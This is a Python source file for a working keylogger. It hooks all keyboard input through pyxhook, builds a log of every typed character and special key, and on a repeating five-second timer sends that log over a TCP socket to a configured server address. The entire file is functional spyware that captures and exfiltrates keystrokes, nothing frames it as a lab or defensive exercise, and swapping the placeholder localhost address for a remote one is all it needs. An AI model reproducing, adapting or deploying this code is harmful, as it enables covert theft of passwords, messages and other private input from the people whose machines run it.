from threading import Timer

import pyxhook
import socket


class Logger:
    def __init__(self):
        self.log_string = ""
        self.ip = "127.0.0.1"
        self.port = 8080

    def send_log(self):
        try:
            if self.log_string:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    print("sending", self.log_string)
                    s.connect((self.ip, self.port))
                    stream = self.log_string.encode()
                    s.sendall(stream)
                    # Reply from server
                    s.recv(1024)
                    self.log_string = ""
            timer = Timer(interval=5, function=self.send_log)
            timer.daemon = True
            timer.start()

        except Exception as ex:
            print("An error occured")

    def key_event(self, event):
        # Only adds character to log string if it is a printing character
        if 32 <= event.Ascii <= 126:
            self.log_string += chr(event.Ascii)
        # Non printed characters will be placed in brackets
        else:
            self.log_string += '[{}]'.format(event.Key)


logger = Logger()
# create a hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = logger.key_event
# set the hook
new_hook.HookKeyboard()
new_hook.start()
logger.send_log()